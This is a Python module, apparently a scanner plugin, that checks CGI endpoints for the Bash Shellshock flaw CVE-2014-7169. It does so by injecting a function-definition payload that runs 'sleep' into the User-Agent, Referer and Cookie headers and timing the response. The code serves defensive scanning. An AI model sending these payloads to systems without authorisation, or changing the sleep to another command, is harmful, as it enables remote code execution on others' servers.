"""Agent Asteroid implementation for CVE-2014-7169"""

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "GNU Bourne-Again Shell (Bash) Arbitrary Code Execution Vulnerability."
)
VULNERABILITY_REFERENCE = "CVE-2014-7169"
VULNERABILITY_DESCRIPTION = (
    "GNU Bash through 4.3 bash43-025 processes trailing strings after certain malformed function "
    "definitions in the values of environment variables, which allows remote attackers to write to "
    "files or possibly have unknown other impact via a crafted environment, as demonstrated by vectors "
    "involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache "
    "HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting "
    "the environment occurs across a privilege boundary from Bash execution. "
    "NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-6271."
)
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 90
PAYLOAD_TEMPLATE = "() { :;}; /bin/bash -c 'sleep %s'"
MAX_DELAY_DIFFERENCE = 5
DELAYS = [30, 40, 50, 60]


@exploits_registry.register
class CVE20147169Exploit(definitions.Exploit):
    """CVE-2014-7169: GNU Bourne-Again Shell (Bash) Arbitrary Code Execution Vulnerability."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        has_public_exploit=True,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2014-7169"],
    )

    def accept(self, target: definitions.Target) -> bool:
        if target.path.endswith(".cgi") is False:
            return False
        try:
            resp = self.session.get(target.url, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        if resp.status_code == 200:
            return True
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        for delay in DELAYS:
            payload = PAYLOAD_TEMPLATE % delay
            try:
                resp = self.session.get(
                    target.url,
                    headers={
                        "User-Agent": payload,
                        "Referer": payload,
                        "Cookie": payload,
                    },
                )
            except requests_exceptions.RequestException:
                return []
            elapsed = resp.elapsed.seconds
            if elapsed < delay or elapsed - delay > MAX_DELAY_DIFFERENCE:
                return []

        vulnerability = self.create_vulnerability(target)
        return [vulnerability]
